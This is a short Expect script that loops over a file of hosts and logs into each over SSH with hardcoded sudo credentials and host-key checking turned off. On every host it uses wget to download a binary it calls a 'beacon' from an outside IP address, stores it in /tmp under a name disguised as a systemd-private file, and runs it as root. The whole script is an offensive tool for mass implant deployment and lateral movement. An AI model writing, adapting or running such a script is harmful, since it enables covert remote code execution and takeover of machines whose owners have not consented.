#!/usr/bin/expect -f

# Set the command to plant the beacon
set PLANT_BEACON_COMMAND "sudo wget http://172.16.119.87/linux -O /tmp/systemd-private-%u-%p-%%%%-%n && sudo chmod +x /tmp/systemd-private-%u-%p-%%%%-%n"

# Set the command to activate the beacon as root
set ACTIVATE_BEACON_COMMAND "sudo /tmp/systemd-private-%u-%p-%%%%-%n"

# Set the username and password for sudo
set USERNAME "supersusadmin"
set SUDO_PASSWORD "supersus"

# Set options for SSH
set SSH_OPTIONS "-o StrictHostKeyChecking=no"

# Loop through the list of hosts in the HOSTFILE
set fd [open "HOSTFILE"]
set hosts [split [read $fd] "\n"]
close $fd
foreach HOST $hosts {
  # Plant the beacon on the host
  puts "Planting beacon on ${HOST}..."
  spawn ssh $SSH_OPTIONS $USERNAME@$HOST $PLANT_BEACON_COMMAND
  expect {
    "sudo password:" {
      send "$SUDO_PASSWORD\r"
      exp_continue
    }
    "password:" {
      send "$SUDO_PASSWORD\r"
      exp_continue
    }
    eof
  }

  # Activate the beacon as root on the host
  puts "Activating beacon as root on ${HOST}..."
  spawn ssh $SSH_OPTIONS $USERNAME@$HOST $ACTIVATE_BEACON_COMMAND
  expect {
    "sudo password:" {
      send "$SUDO_PASSWORD\r"
      exp_continue
    }
    "password:" {
      send "$SUDO_PASSWORD\r"
      exp_continue
    }
    eof
  }
}

puts "Done."